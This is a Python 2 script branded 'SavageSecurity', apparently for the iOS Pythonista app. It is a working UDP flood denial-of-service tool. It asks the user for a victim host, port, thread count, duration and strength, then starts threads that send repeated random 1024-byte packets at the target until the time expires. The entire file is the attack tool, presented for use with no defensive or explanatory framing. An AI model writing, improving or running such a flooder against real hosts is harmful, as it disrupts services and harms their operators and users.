import socket, sys, os, time, itertools, threading, random

try:
	import console
	def credits():
		console.set_color(130, 0, 0)
		print "\n     -+--=:=-  -++-  -=:=--+-"
		console.set_color()
		console.set_font('HoeflerText-Black')
		print " " * 32 + "SavageSecurity"
		console.set_font()
		console.set_color(130, 0, 0)
		print "     -+--=:=-  -++-  -=:=--+-\n"
except:
	def credits():
		print "\n     -+--=:=-  -++-  -=:=--+-"
		print " " * 11 + "SavageSecurity"
		print "     -+--=:=-  -++-  -=:=--+-\n"
	pass
print "\nWarning: Running Multiple Threads Can Be Laggy For iOS Devices, And If You Are Using An iOS Device, Than This Program Option Is Less Effective Than A Regular DOS!\n"
time.sleep(4)
socket.setdefaulttimeout(10)
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
daemonslayer = []

def dos(victim,vport,duration,name,strng):
	bytes = random._urandom(1024) * strng
	timeout = time.time() + duration
	sent = 0
	while 1:
		if time.time() > timeout:
			break		
		else:
			pass
		try:
			client.sendto(bytes, (victim, vport))
			client.sendto(bytes, (victim, vport))
			client.sendto(bytes, (victim, vport))
			client.sendto(bytes, (victim, vport))
			client.sendto(bytes, (victim, vport))
		except:
			pass
		if name in daemonslayer:
			break
		sent = sent + 5
		sys.stdout.write("%s Packets: %s\r\n" %(name, sent))

credits()
victim = raw_input("Host: ")
vport = input("Port: ")
thrd = input("Threads: ")
if thrd > 10:
	thrd = random.choice(range(2,7))
duration = input("Time: ")
strng = input("Strength (0-9): ")
if strng > 9:
	strng = random.choice(range(2,7))
anti = raw_input("Anti-Lag? y/n: ")
print ""

threads = []
for i in range(thrd):
	name = "DoSDaemon-" + str(i)
	t = threading.Thread(target=dos,args = (victim,vport,duration,name,strng))
	t.daemon = True
	if i != thrd-1:
		threads.append(name)
	t.start()

if anti == "y":
	while 1:
		time.sleep(0.7)
		if len(threads) > 1:
			kill = random.choice(threads)
			daemonslayer.append(kill)
			threads.remove(kill)
		else:
			break

while 1:
	if not t.is_alive():
		console.set_color()
		try:
			console.set_font('Damascus',15)
		except: pass
		print "\nDaemon(s) Slayed:", thrd - len(threads) - 1
		try:
			console.set_font()
		except: pass
		print ""
		break
